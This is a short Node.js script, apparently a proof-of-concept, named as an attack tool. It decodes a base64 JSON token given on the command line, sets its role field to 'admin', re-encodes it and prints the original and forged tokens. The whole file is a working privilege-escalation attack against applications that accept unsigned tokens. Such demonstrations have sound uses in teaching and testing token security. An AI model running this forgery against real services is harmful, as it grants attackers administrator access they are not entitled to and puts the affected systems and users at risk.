const token = process.argv[2];

if (!token) {
  console.error("Usage: node attack-forge-token.js <token>");
  process.exit(1);
}

function forgeToken(token, overrides) {
  const decoded = JSON.parse(Buffer.from(token, "base64").toString("utf8"));
  const forged = { ...decoded, ...overrides };
  return Buffer.from(JSON.stringify(forged)).toString("base64");
}

const forgedToken = forgeToken(token, { role: "admin" });

console.log("\n Original token:", token);
console.log("\n Forged   token:", forgedToken);